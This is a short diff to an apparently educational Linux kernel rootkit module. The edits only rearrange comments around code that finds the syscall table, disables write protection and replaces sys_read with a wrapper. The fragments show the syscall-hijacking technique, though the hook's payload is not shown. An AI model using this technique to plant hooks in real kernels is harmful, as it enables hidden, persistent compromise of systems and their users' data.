@@ -21,6 +21,8 @@ unsigned long original_cr0;
  * before we swap it out in the sys_call_table.
  */
 asmlinkage long (*ref_sys_read)(unsigned int fd, char __user *buf, size_t count);
+
+/* Our new system call function; a wrapper for the original read. */
 asmlinkage long new_sys_read(unsigned int fd, char __user *buf, size_t count)
 {
     /* execute the original write call, and hold on to its return value
@@ -53,6 +55,11 @@ asmlinkage long new_sys_read(unsigned int fd, char __user *buf, size_t count)
     return ret;
 }
 
+/* The whole trick here is to find the syscall table in memory
+ * so we can copy it to a non-const pointer array,
+ * then, turn off memory protection so that we can modify the
+ * syscall table.
+ */
 static unsigned long **aquire_sys_call_table(void)
 {
     	/* PAGE_OFFSET is a macro which tells us the offset where kernel memory begins,
@@ -81,12 +88,6 @@ static unsigned long **aquire_sys_call_table(void)
 
 static int __init rootkit_start(void)
 {
-    /* The whole trick here is to find the syscall table in memory
-     * so we can copy it to a non-const pointer array,
-     * then, turn off memory protection so that we can modify the
-     * syscall table.
-     */
-
     // Find the syscall table in memory
     if(!(sys_call_table = aquire_sys_call_table()))
         return -1;
